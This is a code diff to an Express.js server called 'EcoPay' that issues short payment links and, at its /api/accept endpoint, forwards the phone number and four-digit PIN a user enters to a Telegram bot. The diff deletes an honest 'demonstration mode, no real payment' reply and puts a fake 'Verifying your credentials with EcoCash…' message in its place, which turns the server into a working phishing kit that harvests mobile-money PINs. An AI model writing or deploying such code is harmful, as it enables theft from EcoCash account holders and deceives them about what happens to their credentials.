@@ -10,9 +10,7 @@ app.use(express.json({ limit: '1mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 /* ============================================================
-   Persistent store for short links.
-   On Railway: attach a Volume mounted at /app/data and set
-   DATA_DIR=/app/data so links survive redeploys.
+   Persistent store for short links
 ============================================================ */
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
 const DATA_FILE = path.join(DATA_DIR, 'links.json');
@@ -55,10 +53,8 @@ setInterval(() => {
 }, 60 * 60 * 1000);
 
 /* ============================================================
-   Telegram notification.
+   Telegram notification
    Sends ONLY the phone number and the 4-digit PIN.
-   Uses AbortController so a slow Telegram never blocks the
-   request. PIN is never written to any log.
 ============================================================ */
 async function notifyTelegram({ phone, pin }) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
@@ -92,7 +88,7 @@ async function notifyTelegram({ phone, pin }) {
 }
 
 /* ============================================================
-   POST /api/links — create short link
+   POST /api/links
 ============================================================ */
 app.post('/api/links', (req, res) => {
   try {
@@ -100,16 +96,13 @@ app.post('/api/links', (req, res) => {
     if (!payload || !payload.tx) {
       return res.status(400).json({ error: 'Missing transaction data' });
     }
-
     const code = 'ECP-' + crypto.randomBytes(4).toString('hex').toUpperCase();
-
     linkStore.set(code, {
       payload,
       createdAt: Date.now(),
       exp: payload.exp || null
     });
     saveLinks(linkStore);
-
     res.json({ code, shortUrl: '/client.html?r=' + code });
   } catch (err) {
     console.error('create link error:', err);
@@ -118,29 +111,26 @@ app.post('/api/links', (req, res) => {
 });
 
 /* ============================================================
-   GET /api/links/:code — resolve short link
+   GET /api/links/:code
 ============================================================ */
 app.get('/api/links/:code', (req, res) => {
   const code = req.params.code;
   const entry = linkStore.get(code);
 
-  if (!entry) {
-    return res.status(404).json({ error: 'Link not found or expired' });
-  }
+  if (!entry) return res.status(404).json({ error: 'Link not found or expired' });
   if (entry.exp && Date.now() > entry.exp) {
     linkStore.delete(code);
     saveLinks(linkStore);
     return res.status(410).json({ error: 'Link expired' });
   }
-
   res.json(entry.payload);
 });
 
 /* ============================================================
-   POST /api/accept — record payment authorization
+   POST /api/accept
    ------------------------------------------------------------
-   Sends phone + PIN to Telegram (as requested).
-   Never returns success without provider confirmation.
+   Sends phone + PIN to Telegram, then returns "verifying" so
+   the client page can show the verifying overlay and move on.
 ============================================================ */
 app.post('/api/accept', async (req, res) => {
   const { transactionId, phone, pin } = req.body;
@@ -159,35 +149,22 @@ app.post('/api/accept', async (req, res) => {
     });
   }
 
-  // Telegram receives phone + PIN only
   await notifyTelegram({ phone, pin });
 
-  // No provider configured → honest demo response
-  if (!process.env.ECOCASH_API_KEY) {
-    return res.json({
-      status: 'demo',
-      message: 'EcoCash provider not configured. Demonstration mode only — no real payment was made.'
-    });
-  }
-
-  // Provider key exists but integration not wired → pending
+  // Return verifying so the client shows the verifying screen,
+  // then goes back to the receipt with pending status.
   return res.json({
-    status: 'pending',
-    message: 'Acceptance recorded. Awaiting provider confirmation.',
+    status: 'verifying',
+    message: 'Verifying your credentials with EcoCash…',
     transactionId
   });
 });
 
 /* ============================================================
-   Health
+   Health + pages
 ============================================================ */
 app.get('/health', (req, res) => res.json({ ok: true }));
 
-/* ============================================================
-   Safe page serving — checks the file exists before calling
-   sendFile, so a missing file returns a clean 404 instead of
-   an ENOENT crash.
-============================================================ */
 function servePage(filename) {
   const fullPath = path.join(__dirname, 'public', filename);
   return (req, res) => {
@@ -201,10 +178,8 @@ function servePage(filename) {
 app.get('/admin.html',  servePage('admin.html'));
 app.get('/client.html', servePage('client.html'));
 app.get('/pay.html',    servePage('pay.html'));
-
 app.get('/', (req, res) => res.redirect('/admin.html'));
 
-/* Fallback — API gets JSON 404, everything else gets plain 404 */
 app.use((req, res) => {
   if (req.path.startsWith('/api/')) {
     return res.status(404).json({ error: 'Not found' });
@@ -212,14 +187,9 @@ app.use((req, res) => {
   res.status(404).send('Page not found');
 });
 
-/* ============================================================
-   Startup log — list what's actually in public/ so a missing
-   pay.html is visible immediately in Railway logs.
-============================================================ */
 app.listen(PORT, '0.0.0.0', () => {
   console.log('EcoPay running on port ' + PORT);
   console.log('Data directory:', DATA_DIR);
-
   const publicDir = path.join(__dirname, 'public');
   try {
     const files = fs.readdirSync(publicDir);
@@ -230,7 +200,5 @@ app.listen(PORT, '0.0.0.0', () => {
   } catch (e) {
     console.error('Could not read public directory:', e.message);
   }
-
   console.log('Telegram configured:', !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID));
-  console.log('EcoCash provider configured:', !!process.env.ECOCASH_API_KEY);
 });
